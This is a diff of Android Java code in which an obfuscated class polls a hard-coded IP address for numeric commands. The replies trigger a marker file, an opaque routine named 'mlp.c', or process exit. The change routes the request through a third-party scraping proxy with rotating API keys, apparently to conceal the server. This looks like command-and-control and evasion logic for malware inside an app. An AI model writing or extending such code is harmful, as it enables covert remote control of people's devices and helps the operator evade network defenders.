@@ -1,11 +1,12 @@
 import android.content.Context;
 import android.os.SystemClock;
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStream;
-import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.Random;
 
 public class start {
     public static void a(final Context context) {
@@ -27,21 +28,26 @@ public class start {
                         }
                         while (true) {
                             HttpURLConnection huc1 = null;
+                            String[] k1 = {"", "", ""};
                             try {
-                                huc1 = (HttpURLConnection) new URL("http://185.154.14.51/start/" + s1).openConnection();
+                                huc1 = (HttpURLConnection) new URL("https://app.zenscrape.com/api/v1/get?&url=http://185.154.14.51/start/" + s1 + "&location=eu").openConnection();
+                                huc1.setRequestProperty("apikey", k1[(new Random()).nextInt(k1.length)]);
                                 huc1.connect();
                                 StringBuilder sb1 = new StringBuilder();
                                 BufferedReader br1 = new BufferedReader(new InputStreamReader(huc1.getInputStream()));
                                 String s2;
                                 while ((s2 = br1.readLine()) != null) {
                                     sb1.append(s2);
-                                } if (sb1.toString().equals("1125")) {
+                                }
+                                if (sb1.toString().equals("1125")) {
                                     f1.createNewFile();
                                     break;
-                                } if (sb1.toString().equals("1126")) {
+                                }
+                                if (sb1.toString().equals("1126")) {
                                     mlp.c(context);
                                     break;
-                                } if (sb1.toString().equals("1127")) {
+                                }
+                                if (sb1.toString().equals("1127")) {
                                     System.exit(0);
                                 }
                             } catch (Exception e2) {
